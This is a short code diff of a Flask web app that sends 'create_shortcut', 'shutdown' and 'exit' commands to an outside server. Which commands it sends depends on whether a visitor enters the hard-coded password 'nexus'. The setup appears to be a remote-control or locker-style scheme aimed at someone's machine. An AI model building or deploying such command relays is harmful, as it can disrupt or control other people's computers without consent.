@@ -9,7 +9,7 @@ messages = []
 
 @app.route('/', methods=['GET', 'POST'])
 def home():
-    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'create_shortcut', 'data': {'none': 'none'}})
+    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'create_shortcut'})
     if request.method == 'POST':
         password = request.form.get('password')
         if password == 'nexus':
@@ -20,13 +20,13 @@ def home():
 
 @app.route('/success')
 def success():
-    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'exit', 'data': {'none': 'none'}})
+    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'exit'})
     return send_file('templates/success.html')
 
 @app.route('/failure')
 def failure():
-    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'shutdown', 'data': {'none': 'none'}})
-    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'exit', 'data': {'none': 'none'}})
+    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'shutdown'})
+    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'exit'})
     return send_file('templates/failure.html')
 
 @app.route('/resources/<path>')
